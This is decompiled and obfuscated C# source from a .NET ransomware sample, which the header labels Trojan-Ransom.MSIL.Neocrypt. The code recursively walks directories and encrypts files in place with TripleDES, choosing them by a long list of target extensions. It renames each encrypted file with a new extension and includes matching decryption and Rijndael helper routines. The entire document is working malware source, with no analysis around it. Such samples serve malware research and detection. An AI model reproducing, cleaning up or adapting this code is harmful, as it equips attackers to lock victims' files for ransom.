// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=679946a7cf437fcb
// MVID: 86897229-7BC6-4141-B9B1-66C325C24A9D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Neocrypt.d-9ac5e14466821854f24f31402e9e3cdf97e476fcd0edf111aab0d7189ab5e577.exe

using \u0003;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Security.Cryptography;

namespace \u0003
{
  internal class \u0002
  {
    private static TripleDESCryptoServiceProvider \u0001;
    private static MD5CryptoServiceProvider \u0001;
    [NonSerialized]
    internal static \u0006 \u0082;

    static \u0002()
    {
      \u0007.\u0001(typeof (\u0002));
      \u0002.\u0001 = new TripleDESCryptoServiceProvider();
      \u0002.\u0001 = new MD5CryptoServiceProvider();
    }

    private static byte[] \u0001(string value) => \u0093.\u007E\u0004\u0003((object) \u0002.\u0001, \u0092.\u007E\u0002\u0003((object) \u0091.\u009D\u0002(), value));

    private static byte[] \u0001(byte[] fileToEncrypt, string key)
    {
label_0:
      byte[] numArray;
      try
      {
        if (true)
          \u0094.\u007E\u0005\u0003((object) \u0002.\u0001, \u0002.\u0001(key));
        \u0095.\u007E\u0008\u0003((object) \u0002.\u0001, CipherMode.ECB);
        do
        {
          if (true)
            numArray = \u0097.\u007E\u0010\u0003((object) \u0096.\u007E\u000E\u0003((object) \u0002.\u0001), fileToEncrypt, 0, fileToEncrypt.Length);
          else
            goto label_0;
        }
        while (false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray = fileToEncrypt;
        if (true)
          \u008E.\u0099\u0002();
        else
          \u008E.\u0099\u0002();
      }
      return numArray;
    }

    private static byte[] \u0002(byte[] encryptedFile, string key)
    {
      byte[] numArray;
      try
      {
        \u0094.\u007E\u0005\u0003((object) \u0002.\u0001, \u0002.\u0001(key));
        \u0095.\u007E\u0008\u0003((object) \u0002.\u0001, CipherMode.ECB);
        numArray = \u0097.\u007E\u0010\u0003((object) \u0096.\u007E\u000F\u0003((object) \u0002.\u0001), encryptedFile, 0, encryptedFile.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray = encryptedFile;
        \u008E.\u0099\u0002();
        if (false)
          \u008E.\u0099\u0002();
      }
      return numArray;
    }

    public static unsafe void \u0001(object param_obj)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(21);
label_1:
      try
      {
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        string path = \u001B.\u0081\u0002(\u0098.\u0011\u0003(param_obj, new object[1]
        {
          (object) 0
        }, (string[]) null));
label_2:
        *(int*) ((IntPtr) voidPtr + 16) = 2;
        string key = \u001B.\u0081\u0002(\u0098.\u0011\u0003(param_obj, new object[1]
        {
          (object) 1
        }, (string[]) null));
label_3:
        *(int*) ((IntPtr) voidPtr + 16) = 3;
        *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) (\u0099.\u0012\u0003(\u0098.\u0011\u0003(param_obj, new object[1]
        {
          (object) 2
        }, (string[]) null)) ? 1 : 0);
label_4:
        *(int*) ((IntPtr) voidPtr + 16) = 4;
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
label_5:
        *(int*) ((IntPtr) voidPtr + 16) = 5;
        if (!\u0004.\u007E\u0007((object) directoryInfo))
          goto label_121;
label_6:
        *(int*) ((IntPtr) voidPtr + 16) = 8;
        if (\u0015.\u001A\u0002(path, \u001D.\u0083\u0002(\u009A.\u0013\u0003(\u0002.\u0082(1300)), \u0002.\u0082(1317)), false) == 0)
          goto label_96;
label_7:
        \u008E.\u0099\u0002();
        *(int*) ((IntPtr) voidPtr + 8) = 1;
label_8:
        *(int*) ((IntPtr) voidPtr + 16) = 12;
        string[] strArray1 = \u009B.\u0015\u0003(\u0011.\u007E\u0092((object) directoryInfo));
        *(int*) voidPtr = 0;
        goto label_95;
label_10:
        *(int*) ((IntPtr) voidPtr + 16) = 13;
        if (*(sbyte*) ((IntPtr) voidPtr + 20) == (sbyte) 0)
          goto label_87;
label_11:
        *(int*) ((IntPtr) voidPtr + 16) = 14;
        string fileName;
        FileInfo fileInfo1 = new FileInfo(fileName);
label_12:
        *(int*) ((IntPtr) voidPtr + 16) = 15;
        if (\u0015.\u001A\u0002(\u0011.\u007E\u0094((object) \u0011.\u007E\u0093((object) fileInfo1)), \u0002.\u0082(1322), false) == 0)
          goto label_93;
label_13:
        *(int*) ((IntPtr) voidPtr + 16) = 16;
        string str1 = \u0011.\u007E\u0094((object) \u0011.\u007E\u0093((object) fileInfo1));
label_14:
        *(int*) ((IntPtr) voidPtr + 16) = 19;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1331), false) != 0)
          goto label_16;
label_15:
        *(int*) ((IntPtr) voidPtr + 16) = 20;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_16:
        *(int*) ((IntPtr) voidPtr + 16) = 22;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1340), false) != 0)
          goto label_18;
label_17:
        *(int*) ((IntPtr) voidPtr + 16) = 23;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_18:
        *(int*) ((IntPtr) voidPtr + 16) = 25;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1349), false) != 0)
          goto label_20;
label_19:
        *(int*) ((IntPtr) voidPtr + 16) = 26;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_20:
        *(int*) ((IntPtr) voidPtr + 16) = 28;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1358), false) != 0)
          goto label_22;
label_21:
        *(int*) ((IntPtr) voidPtr + 16) = 29;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_22:
        *(int*) ((IntPtr) voidPtr + 16) = 31;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1367), false) != 0)
          goto label_24;
label_23:
        *(int*) ((IntPtr) voidPtr + 16) = 32;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_24:
        *(int*) ((IntPtr) voidPtr + 16) = 34;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1376), false) != 0)
          goto label_26;
label_25:
        *(int*) ((IntPtr) voidPtr + 16) = 35;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_26:
        *(int*) ((IntPtr) voidPtr + 16) = 37;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1385), false) != 0)
          goto label_28;
label_27:
        *(int*) ((IntPtr) voidPtr + 16) = 38;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_28:
        *(int*) ((IntPtr) voidPtr + 16) = 40;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1394), false) != 0)
          goto label_30;
label_29:
        *(int*) ((IntPtr) voidPtr + 16) = 41;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_30:
        *(int*) ((IntPtr) voidPtr + 16) = 43;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1403), false) != 0)
          goto label_32;
label_31:
        *(int*) ((IntPtr) voidPtr + 16) = 44;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_32:
        *(int*) ((IntPtr) voidPtr + 16) = 46;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1412), false) != 0)
          goto label_34;
label_33:
        *(int*) ((IntPtr) voidPtr + 16) = 47;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_34:
        *(int*) ((IntPtr) voidPtr + 16) = 49;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1421), false) != 0)
          goto label_36;
label_35:
        *(int*) ((IntPtr) voidPtr + 16) = 50;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_36:
        *(int*) ((IntPtr) voidPtr + 16) = 52;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1430), false) != 0)
          goto label_38;
label_37:
        *(int*) ((IntPtr) voidPtr + 16) = 53;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_38:
        *(int*) ((IntPtr) voidPtr + 16) = 55;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1439), false) != 0)
          goto label_40;
label_39:
        *(int*) ((IntPtr) voidPtr + 16) = 56;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_40:
        *(int*) ((IntPtr) voidPtr + 16) = 58;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1448), false) != 0)
          goto label_42;
label_41:
        *(int*) ((IntPtr) voidPtr + 16) = 59;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_42:
        *(int*) ((IntPtr) voidPtr + 16) = 61;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1457), false) != 0)
          goto label_44;
label_43:
        *(int*) ((IntPtr) voidPtr + 16) = 62;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_44:
        *(int*) ((IntPtr) voidPtr + 16) = 64;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1466), false) != 0)
          goto label_46;
label_45:
        *(int*) ((IntPtr) voidPtr + 16) = 65;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_46:
        *(int*) ((IntPtr) voidPtr + 16) = 67;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1475), false) != 0)
          goto label_48;
label_47:
        *(int*) ((IntPtr) voidPtr + 16) = 68;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_48:
        *(int*) ((IntPtr) voidPtr + 16) = 70;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1484), false) != 0)
          goto label_50;
label_49:
        *(int*) ((IntPtr) voidPtr + 16) = 71;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_50:
        *(int*) ((IntPtr) voidPtr + 16) = 73;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1493), false) != 0)
          goto label_52;
label_51:
        *(int*) ((IntPtr) voidPtr + 16) = 74;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_52:
        *(int*) ((IntPtr) voidPtr + 16) = 76;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1502), false) != 0)
          goto label_54;
label_53:
        *(int*) ((IntPtr) voidPtr + 16) = 77;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_54:
        *(int*) ((IntPtr) voidPtr + 16) = 79;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1511), false) != 0)
          goto label_56;
label_55:
        *(int*) ((IntPtr) voidPtr + 16) = 80;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_56:
        *(int*) ((IntPtr) voidPtr + 16) = 82;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1520), false) != 0)
          goto label_58;
label_57:
        *(int*) ((IntPtr) voidPtr + 16) = 83;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_58:
        *(int*) ((IntPtr) voidPtr + 16) = 85;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1525), false) != 0)
          goto label_60;
label_59:
        *(int*) ((IntPtr) voidPtr + 16) = 86;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_60:
        *(int*) ((IntPtr) voidPtr + 16) = 88;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1530), false) != 0)
          goto label_62;
label_61:
        *(int*) ((IntPtr) voidPtr + 16) = 89;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_62:
        *(int*) ((IntPtr) voidPtr + 16) = 91;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1539), false) != 0)
          goto label_64;
label_63:
        *(int*) ((IntPtr) voidPtr + 16) = 92;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_64:
        *(int*) ((IntPtr) voidPtr + 16) = 94;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1548), false) != 0)
          goto label_66;
label_65:
        *(int*) ((IntPtr) voidPtr + 16) = 95;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_66:
        *(int*) ((IntPtr) voidPtr + 16) = 97;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1557), false) != 0)
          goto label_68;
label_67:
        *(int*) ((IntPtr) voidPtr + 16) = 98;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_68:
        *(int*) ((IntPtr) voidPtr + 16) = 100;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1566), false) != 0)
          goto label_70;
label_69:
        *(int*) ((IntPtr) voidPtr + 16) = 101;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_70:
        *(int*) ((IntPtr) voidPtr + 16) = 103;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1575), false) != 0)
          goto label_72;
label_71:
        *(int*) ((IntPtr) voidPtr + 16) = 104;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_72:
        *(int*) ((IntPtr) voidPtr + 16) = 106;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1584), false) != 0)
          goto label_74;
label_73:
        *(int*) ((IntPtr) voidPtr + 16) = 107;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_74:
        *(int*) ((IntPtr) voidPtr + 16) = 109;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1593), false) != 0)
          goto label_76;
label_75:
        *(int*) ((IntPtr) voidPtr + 16) = 110;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_76:
        *(int*) ((IntPtr) voidPtr + 16) = 112;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1602), false) != 0)
          goto label_78;
label_77:
        *(int*) ((IntPtr) voidPtr + 16) = 113;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_78:
        *(int*) ((IntPtr) voidPtr + 16) = 115;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1611), false) != 0)
          goto label_80;
label_79:
        *(int*) ((IntPtr) voidPtr + 16) = 116;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_80:
        *(int*) ((IntPtr) voidPtr + 16) = 118;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1620), false) != 0)
          goto label_82;
label_81:
        *(int*) ((IntPtr) voidPtr + 16) = 119;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_82:
        *(int*) ((IntPtr) voidPtr + 16) = 121;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1629), false) != 0)
          goto label_84;
label_83:
        *(int*) ((IntPtr) voidPtr + 16) = 122;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
        goto label_86;
label_84:
        *(int*) ((IntPtr) voidPtr + 16) = 124;
        if (\u0015.\u001A\u0002(str1, \u0002.\u0082(1638), false) != 0)
          goto label_86;
label_85:
        *(int*) ((IntPtr) voidPtr + 16) = 125;
        \u009D.\u0019\u0003(fileName, \u0002.\u0001(\u009C.\u0017\u0003(fileName), key));
label_86:
        *(int*) ((IntPtr) voidPtr + 16) = (int) sbyte.MaxValue;
        \u0005.\u007E\u0012((object) fileInfo1, \u001D.\u0083\u0002(fileName, \u0002.\u0082(1322)));
        goto label_93;
label_87:
        *(int*) ((IntPtr) voidPtr + 16) = 130;
label_88:
        *(int*) ((IntPtr) voidPtr + 16) = 131;
        FileInfo fileInfo2 = new FileInfo(fileName);
label_89:
        *(int*) ((IntPtr) voidPtr + 16) = 132;
        string str2 = \u0011.\u007E\u0094((object) \u0011.\u007E\u0093((object) fileInfo2));
label_90:
        *(int*) ((IntPtr) voidPtr + 16) = 135;
        if (\u0015.\u001A\u0002(str2, \u0002.\u0082(1322), false) != 0)
          goto label_92;
label_91:
        *(int*) ((IntPtr) voidPtr + 16) = 136;
        \u009D.\u0019\u0003(fileName, \u0002.\u0002(\u009C.\u0017\u0003(fileName), key));
label_92:
        *(int*) ((IntPtr) voidPtr + 16) = 138;
        \u0005.\u007E\u0012((object) fileInfo2, \u009E.\u007E\u001A\u0003((object) fileName, \u0002.\u0082(1322), \u0002.\u0082(1647)));
label_93:
        *(int*) voidPtr = checked (*(int*) voidPtr + 1);
label_94:
        *(int*) ((IntPtr) voidPtr + 16) = 140;
label_95:
        if (*(int*) voidPtr < strArray1.Length)
        {
          fileName = strArray1[*(int*) voidPtr];
          goto label_10;
        }
label_96:
        *(int*) ((IntPtr) voidPtr + 16) = 141;
        string[] strArray2 = \u009B.\u0016\u0003(\u0011.\u007E\u0092((object) directoryInfo));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        goto label_114;
label_98:
        *(int*) ((IntPtr) voidPtr + 16) = 142;
        if (*(sbyte*) ((IntPtr) voidPtr + 20) == (sbyte) 0)
          goto label_105;
label_99:
        *(int*) ((IntPtr) voidPtr + 16) = 143;
        string str3;
        if (\u0016.\u007E\u001B\u0002((object) \u0011.\u007E\u0094((object) str3), \u0002.\u0082(1648)))
          goto label_112;
label_100:
        *(int*) ((IntPtr) voidPtr + 16) = 144;
        object[] param_obj1 = new object[3];
label_101:
        *(int*) ((IntPtr) voidPtr + 16) = 145;
        param_obj1[0] = (object) str3;
label_102:
        *(int*) ((IntPtr) voidPtr + 16) = 146;
        param_obj1[1] = (object) key;
label_103:
        *(int*) ((IntPtr) voidPtr + 16) = 147;
        param_obj1[2] = (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 20);
label_104:
        *(int*) ((IntPtr) voidPtr + 16) = 148;
        \u0002.\u0001((object) param_obj1);
        goto label_112;
label_105:
        *(int*) ((IntPtr) voidPtr + 16) = 151;
label_106:
        *(int*) ((IntPtr) voidPtr + 16) = 152;
        if (\u0016.\u007E\u001B\u0002((object) \u0011.\u007E\u0094((object) str3), \u0002.\u0082(1648)))
          goto label_112;
label_107:
        *(int*) ((IntPtr) voidPtr + 16) = 153;
        object[] param_obj2 = new object[3];
label_108:
        *(int*) ((IntPtr) voidPtr + 16) = 154;
        param_obj2[0] = (object) str3;
label_109:
        *(int*) ((IntPtr) voidPtr + 16) = 155;
        param_obj2[1] = (object) key;
label_110:
        *(int*) ((IntPtr) voidPtr + 16) = 156;
        param_obj2[2] = (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 20);
label_111:
        *(int*) ((IntPtr) voidPtr + 16) = 157;
        \u0002.\u0001((object) param_obj2);
label_112:
        *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
label_113:
        *(int*) ((IntPtr) voidPtr + 16) = 160;
label_114:
        if (*(int*) ((IntPtr) voidPtr + 4) < strArray2.Length)
        {
          str3 = strArray2[*(int*) ((IntPtr) voidPtr + 4)];
          goto label_98;
        }
        else
          goto label_121;
label_116:
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16);
        switch (*(int*) ((IntPtr) voidPtr + 8))
        {
          case 1:
            int num = *(int*) ((IntPtr) voidPtr + 12) + 1;
            *(int*) ((IntPtr) voidPtr + 12) = 0;
            switch (num)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
              case 161:
                goto label_121;
              case 7:
              case 8:
                goto label_6;
              case 9:
              case 141:
                goto label_96;
              case 10:
              case 11:
                goto label_7;
              case 12:
                goto label_8;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
                goto label_13;
              case 17:
              case 21:
              case 24:
              case 27:
              case 30:
              case 33:
              case 36:
              case 39:
              case 42:
              case 45:
              case 48:
              case 51:
              case 54:
              case 57:
              case 60:
              case 63:
              case 66:
              case 69:
              case 72:
              case 75:
              case 78:
              case 81:
              case 84:
              case 87:
              case 90:
              case 93:
              case 96:
              case 99:
              case 102:
              case 105:
              case 108:
              case 111:
              case 114:
              case 117:
              case 120:
              case 123:
              case 126:
              case (int) sbyte.MaxValue:
                goto label_86;
              case 18:
              case 19:
                goto label_14;
              case 20:
                goto label_15;
              case 22:
                goto label_16;
              case 23:
                goto label_17;
              case 25:
                goto label_18;
              case 26:
                goto label_19;
              case 28:
                goto label_20;
              case 29:
                goto label_21;
              case 31:
                goto label_22;
              case 32:
                goto label_23;
              case 34:
                goto label_24;
              case 35:
                goto label_25;
              case 37:
                goto label_26;
              case 38:
                goto label_27;
              case 40:
                goto label_28;
              case 41:
                goto label_29;
              case 43:
                goto label_30;
              case 44:
                goto label_31;
              case 46:
                goto label_32;
              case 47:
                goto label_33;
              case 49:
                goto label_34;
              case 50:
                goto label_35;
              case 52:
                goto label_36;
              case 53:
                goto label_37;
              case 55:
                goto label_38;
              case 56:
                goto label_39;
              case 58:
                goto label_40;
              case 59:
                goto label_41;
              case 61:
                goto label_42;
              case 62:
                goto label_43;
              case 64:
                goto label_44;
              case 65:
                goto label_45;
              case 67:
                goto label_46;
              case 68:
                goto label_47;
              case 70:
                goto label_48;
              case 71:
                goto label_49;
              case 73:
                goto label_50;
              case 74:
                goto label_51;
              case 76:
                goto label_52;
              case 77:
                goto label_53;
              case 79:
                goto label_54;
              case 80:
                goto label_55;
              case 82:
                goto label_56;
              case 83:
                goto label_57;
              case 85:
                goto label_58;
              case 86:
                goto label_59;
              case 88:
                goto label_60;
              case 89:
                goto label_61;
              case 91:
                goto label_62;
              case 92:
                goto label_63;
              case 94:
                goto label_64;
              case 95:
                goto label_65;
              case 97:
                goto label_66;
              case 98:
                goto label_67;
              case 100:
                goto label_68;
              case 101:
                goto label_69;
              case 103:
                goto label_70;
              case 104:
                goto label_71;
              case 106:
                goto label_72;
              case 107:
                goto label_73;
              case 109:
                goto label_74;
              case 110:
                goto label_75;
              case 112:
                goto label_76;
              case 113:
                goto label_77;
              case 115:
                goto label_78;
              case 116:
                goto label_79;
              case 118:
                goto label_80;
              case 119:
                goto label_81;
              case 121:
                goto label_82;
              case 122:
                goto label_83;
              case 124:
                goto label_84;
              case 125:
                goto label_85;
              case 128:
              case 129:
              case 139:
                goto label_93;
              case 130:
                goto label_87;
              case 131:
                goto label_88;
              case 132:
                goto label_89;
              case 133:
              case 137:
              case 138:
                goto label_92;
              case 134:
              case 135:
                goto label_90;
              case 136:
                goto label_91;
              case 140:
                goto label_94;
              case 142:
                goto label_98;
              case 143:
                goto label_99;
              case 144:
                goto label_100;
              case 145:
                goto label_101;
              case 146:
                goto label_102;
              case 147:
                goto label_103;
              case 148:
                goto label_104;
              case 149:
              case 150:
              case 158:
              case 159:
                goto label_112;
              case 151:
                goto label_105;
              case 152:
                goto label_106;
              case 153:
                goto label_107;
              case 154:
                goto label_108;
              case 155:
                goto label_109;
              case 156:
                goto label_110;
              case 157:
                goto label_111;
              case 160:
                goto label_113;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & *(int*) ((IntPtr) voidPtr + 8) != 0 & *(int*) ((IntPtr) voidPtr + 12) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_116;
      }
      throw \u009F.\u001B\u0003(-2146828237);
label_121:
      if (*(int*) ((IntPtr) voidPtr + 12) == 0)
        return;
      \u008E.\u0099\u0002();
    }

    private static byte[] \u0001(byte[] clearText, byte[] Key, byte[] IV)
    {
      byte[] numArray1;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        Rijndael rijndael = \u0001\u0002.\u001C\u0003();
        \u0094.\u007E\u0006\u0003((object) rijndael, Key);
label_1:
        \u0094.\u007E\u0007\u0003((object) rijndael, IV);
        CryptoStream cryptoStream;
        if (true)
        {
          cryptoStream = new CryptoStream((Stream) memoryStream, \u0096.\u007E\u000E\u0003((object) rijndael), CryptoStreamMode.Write);
          if (true)
            \u0002\u0002.\u007E\u001D\u0003((object) cryptoStream, clearText, 0, clearText.Length);
          else
            goto label_5;
        }
        else
          goto label_5;
label_4:
        \u0013.\u007E\u0002\u0002((object) cryptoStream);
label_5:
        byte[] numArray2 = \u0003\u0002.\u007E\u001F\u0003((object) memoryStream);
        if (true)
        {
          numArray1 = numArray2;
          if (false)
            goto label_4;
        }
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          do
          {
            \u008E.\u0099\u0002();
          }
          while (false);
        }
        while (false);
      }
      return numArray1;
    }

    public static string \u0001(string clearText, string Password)
    {
      string str;
      try
      {
        byte[] clearText1 = \u0092.\u007E\u0002\u0003((object) \u0091.\u009E\u0002(), clearText);
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
        {
          (byte) 73,
          (byte) 118,
          (byte) 97,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 101,
          (byte) 100,
          (byte) 118,
          (byte) 101,
          (byte) 100,
          (byte) 101,
          (byte) 118
        });
        byte[] numArray = \u0002.\u0001(clearText1, \u0004\u0002.\u007E\u007F\u0003((object) passwordDeriveBytes, 32), \u0004\u0002.\u007E\u007F\u0003((object) passwordDeriveBytes, 16));
        str = \u0005\u0002.\u0080\u0003(numArray);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u008E.\u0099\u0002();
      }
      return str;
    }

    private static byte[] \u0002(byte[] cipherData, byte[] Key, byte[] IV)
    {
      byte[] numArray1;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        Rijndael rijndael = \u0001\u0002.\u001C\u0003();
        \u0094.\u007E\u0006\u0003((object) rijndael, Key);
label_1:
        \u0094.\u007E\u0007\u0003((object) rijndael, IV);
        CryptoStream cryptoStream;
        if (true)
        {
          cryptoStream = new CryptoStream((Stream) memoryStream, \u0096.\u007E\u000F\u0003((object) rijndael), CryptoStreamMode.Write);
          if (true)
            \u0002\u0002.\u007E\u001D\u0003((object) cryptoStream, cipherData, 0, cipherData.Length);
          else
            goto label_5;
        }
        else
          goto label_5;
label_4:
        \u0013.\u007E\u0002\u0002((object) cryptoStream);
label_5:
        byte[] numArray2 = \u0003\u0002.\u007E\u001F\u0003((object) memoryStream);
        if (true)
        {
          numArray1 = numArray2;
          if (false)
            goto label_4;
        }
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          do
          {
            \u008E.\u0099\u0002();
          }
          while (false);
        }
        while (false);
      }
      return numArray1;
    }

    public static string \u0002(string cipherText, string Password)
    {
      string str;
      try
      {
        byte[] numArray1 = \u009C.\u0018\u0003(cipherText);
        byte[] cipherData;
        if (true)
          cipherData = numArray1;
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
        {
          (byte) 73,
          (byte) 118,
          (byte) 97,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 101,
          (byte) 100,
          (byte) 118,
          (byte) 101,
          (byte) 100,
          (byte) 101,
          (byte) 118
        });
        byte[] numArray2 = \u0002.\u0002(cipherData, \u0004\u0002.\u007E\u007F\u0003((object) passwordDeriveBytes, 32), \u0004\u0002.\u007E\u007F\u0003((object) passwordDeriveBytes, 16));
        str = \u0006\u0002.\u007E\u0081\u0003((object) \u0091.\u009E\u0002(), numArray2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = \u0002.\u0082(1647);
        \u008E.\u0099\u0002();
      }
      return str;
    }
  }
}
